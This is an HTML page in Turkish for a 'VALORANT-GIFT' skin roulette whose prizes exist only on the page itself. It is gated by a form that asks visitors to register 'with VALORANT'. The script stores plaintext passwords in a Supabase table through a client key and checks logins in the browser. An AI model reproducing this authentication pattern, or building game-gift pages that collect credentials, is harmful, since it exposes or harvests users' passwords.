<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALORANT-GIFT | Rulet</title>
    
    <link rel="icon" type="image/png" href="Valorant_logo_-_pink_color_version.svg.png">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <style>
        body { background-color: #0f1923; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; overflow-x: hidden; }
        
        /* NAVƒ∞GASYON */
        nav { background: #1f2326; padding: 10px 20px; border-bottom: 3px solid #ff4655; display: flex; justify-content: space-between; align-items: center; }
        .logo-section { display: flex; align-items: center; gap: 12px; }
        .nav-logo { height: 35px; filter: drop-shadow(0 0 5px #ff4655); }
        .site-title { font-size: 26px; font-weight: bold; color: #ff4655; letter-spacing: 3px; }

        /* RULET Sƒ∞STEMƒ∞ */
        .roulette-wrapper {
            position: relative;
            display: flex;
            justify-content: center;
            width: 100%;
            margin: 50px 0;
        }

        .roulette-container {
            position: relative;
            width: 600px;
            height: 160px;
            border: 2px solid #ff4655;
            background: #111;
            overflow: hidden;
            border-radius: 4px;
            box-shadow: 0 0 20px rgba(255, 70, 85, 0.3);
        }

        .selector {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 4px;
            height: 100%;
            background-color: #ff4655;
            z-index: 10;
            box-shadow: 0 0 15px #ff4655;
        }

        #roulette-strip {
            display: flex;
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1);
            will-change: transform;
        }

        .skin-item {
            min-width: 160px;
            height: 160px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-right: 1px solid #222;
            background: linear-gradient(180deg, #1b1e21 0%, #0f1923 100%);
        }

        .skin-item img { 
            width: 120px; 
            height: auto; 
            object-fit: contain;
            margin-bottom: 10px; 
        }

        .skin-item span { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #ece8e1; }

        /* Dƒ∞ƒûER STƒ∞LLER */
        #auth-container { margin: 60px auto; max-width: 400px; background: rgba(27, 31, 35, 0.95); padding: 40px; border: 1px solid #ff4655; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #0f1923; border: 1px solid #444; color: white; outline: none; }
        .btn-valorant { background: #ff4655; color: white; border: none; padding: 12px 24px; cursor: pointer; font-weight: bold; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0% 100%); transition: 0.3s; }
        .btn-valorant:hover { background: #ece8e1; color: #ff4655; }
        .btn-valorant:disabled { background: #555; cursor: not-allowed; }
        #game-container { display: none; margin-top: 30px; }
        .inventory { margin-top: 50px; padding: 20px; background: rgba(0,0,0,0.3); }
        .item-card { background: #1f2326; padding: 10px; margin: 8px; border: 1px solid #444; display: inline-block; min-width: 150px; }
    </style>
</head>
<body>

<nav>
    <div class="logo-section">
        <img src="Valorant_logo_-_pink_color_version.svg.png" class="nav-logo" alt="Logo">
        <div class="site-title">VALORANT-GIFT</div>
        <img src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png" class="nav-logo" alt="Gift">
    </div>
    <div id="user-display"></div>
</nav>

<div id="auth-container">
    <h2 style="color: #ece8e1; margin-top: 0;">VALORANT ile KAYIT OL</h2>
    <input type="text" id="username" placeholder="KULLANICI ADI">
    <input type="password" id="password" placeholder="≈ûƒ∞FRE">
    <button class="btn-valorant" style="width: 100%; margin-top: 20px;" onclick="kayitOl()">HESAP OLU≈ûTUR</button>
    <button class="btn-valorant" style="width: 100%; margin-top: 12px; background: #333;" onclick="girisYap()">Gƒ∞Rƒ∞≈û YAP</button>
</div>

<div id="game-container">
    <h1 id="welcome-msg"></h1>
    
    <div class="roulette-wrapper">
        <div class="selector"></div>
        <div class="roulette-container">
            <div id="roulette-strip"></div>
        </div>
    </div>

    <button id="spin-btn" class="btn-valorant" onclick="ruletiBaslat()">KASAYI A√á</button>
    <div id="result" style="margin-top: 20px; font-size: 20px; color: #ff4655; font-weight: bold;"></div>

    <div class="inventory">
        <h4>ENVANTERƒ∞N</h4>
        <div id="items-list">Hen√ºz bir √∂ƒüe yok.</div>
    </div>
</div>

<script>
    const SUPABASE_URL = 'https://iigemvvlznvgneghevev.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm';
    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    // KENDƒ∞ Y√úKLEDƒ∞ƒûƒ∞N RESƒ∞M ƒ∞Sƒ∞MLERƒ∞YLE HAVUZ
    const skinHavuzu = [
        { ad: "Yaƒümacƒ± Vandal", img: "7-seviye-yagmaci-vandalstil-3-beyaz_valorant_full_skin_166121.png" },
        { ad: "Ejder Ate≈üi Operator", img: "Ejder Ate≈üi Operator - Valorant.png" },
        { ad: "ƒ∞yon Sheriff", img: "iyon-sheriff_valorant_full_skin_166481.png" },
        { ad: "Oni Phantom", img: "oni-phantom_valorant_full_skin_166208.png" }
    ];

    function ruletHazirla() {
        const strip = document.getElementById('roulette-strip');
        strip.innerHTML = '';
        // 80 √∂ƒüe ekleyerek uzun bir ≈üerit olu≈üturuyoruz
        for(let i=0; i<80; i++) {
            const skin = skinHavuzu[Math.floor(Math.random() * skinHavuzu.length)];
            strip.innerHTML += `
                <div class="skin-item">
                    <img src="${skin.img}" onerror="this.src='https://via.placeholder.com/120x60/111/ff4655?text=YUKLENIYOR...'">
                    <span>${skin.ad}</span>
                </div>
            `;
        }
    }

    async function ruletiBaslat() {
        const btn = document.getElementById('spin-btn');
        const strip = document.getElementById('roulette-strip');
        const resultDiv = document.getElementById('result');
        
        btn.disabled = true;
        resultDiv.innerText = "";
        
        strip.style.transition = "none";
        strip.style.transform = "translateX(0)";
        
        ruletHazirla();

        setTimeout(() => {
            strip.style.transition = "transform 5s cubic-bezier(0.1, 0, 0.1, 1)";
            // 160px geni≈üliƒüinde skinler kullandƒ±ƒüƒ±mƒ±z i√ßin ona g√∂re mesafe
            const rastgeleKayma = Math.floor(Math.random() * 800) + 7000; 
            strip.style.transform = `translateX(-${rastgeleKayma}px)`;

            setTimeout(() => {
                const items = document.getElementsByClassName('skin-item');
                // Tam ortadaki skini bulma hesabƒ± (600px container / 2 = 300px orta nokta)
                const index = Math.floor((rastgeleKayma + 300) / 160);
                const kazanan = items[index].querySelector('span').innerText;
                
                resultDiv.innerText = "KAZANILAN: " + kazanan;
                btn.disabled = false;

                const list = document.getElementById("items-list");
                if(list.innerText.includes("Hen√ºz")) list.innerText = "";
                list.innerHTML += `<div class="item-card">üéÅ ${kazanan}</div>`;
            }, 5000);
        }, 100);
    }

    async function kayitOl() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        if(!u || !p) return alert("Bo≈ü bƒ±rakma!");
        const { error } = await _supabase.from('users').insert([{ username: u, password: p }]);
        if (error) alert("Hata: " + error.message);
        else alert("Kayƒ±t ba≈üarƒ±lƒ±!");
    }

    async function girisYap() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        const { data } = await _supabase.from('users').select('*').eq('username', u).eq('password', p);
        if (data && data.length > 0) {
            document.getElementById('auth-container').style.display = 'none';
            document.getElementById('game-container').style.display = 'block';
            document.getElementById('welcome-msg').innerText = "Ho≈ü geldin, " + u;
            document.getElementById('user-display').innerText = "üë§ " + u;
            ruletHazirla();
        } else {
            alert("Hatalƒ± giri≈ü!");
        }
    }
</script>

</body>
</html>
